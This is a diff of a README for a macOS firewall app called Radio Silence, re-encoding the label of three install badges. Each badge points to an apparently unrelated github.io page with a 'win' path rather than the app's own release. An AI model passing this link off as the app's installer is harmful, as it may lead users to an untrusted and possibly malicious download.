@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Radio Silence](https://img.shields.io/badge/⬇_Install_Radio%20Silence-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Radio Silence](https://img.shields.io/badge/⬇_Install_Radio+Silence-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Radio Silence is a simple macOS firewall application that blocks applications fr
 
 <div align="center">
 
-[![⬇ Install Radio Silence](https://img.shields.io/badge/⬇_Install_Radio%20Silence-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Radio Silence](https://img.shields.io/badge/⬇_Install_Radio+Silence-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Radio Silence is a simple macOS firewall application that blocks applications fr
 
 <div align="center">
 
-[![⬇ Install Radio Silence](https://img.shields.io/badge/⬇_Install_Radio%20Silence-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Radio Silence](https://img.shields.io/badge/⬇_Install_Radio+Silence-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
